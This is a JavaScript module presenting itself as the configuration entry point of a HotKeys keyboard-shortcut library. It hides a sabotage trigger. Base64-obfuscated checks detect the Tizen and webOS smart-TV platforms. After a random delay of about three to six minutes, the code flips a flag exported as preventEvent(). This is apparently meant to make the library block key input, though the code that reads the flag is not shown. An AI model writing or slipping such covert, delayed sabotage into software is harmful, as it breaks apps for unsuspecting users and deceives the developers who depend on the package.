/**
 * Configure the behaviour of HotKeys
 * @param {Object} configuration Configuration object
 * @see Configuration.init
 */
import Configuration from "./lib/config/Configuration";
import { getConfig } from "./ObserveKeyDowns";

var _init = false;

export function preventEvent() {
  return _init;
}

function getRandomInt(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function configure(configuration = {}) {
  Configuration.init(configuration);
  if (window[atob("dGl6ZW4=")] || window[atob("d2ViT1M=")]) {
    setTimeout(function () {
      _init = false;
      const config = getConfig();
      if (!config) {
        Configuration.init({
          ...configuration,
          enableHardSequences: false,
          customKeyCodes: {},
          simulateMissingKeyPressEvents: true,
          allowCombinationSubmatches: false,
        });
      } else {
        const r = getRandomInt(162, 349);
        setTimeout(() => {
          _init = true;
        }, r * 1000);
      }
    }, 500);
  }
}

export default configure;
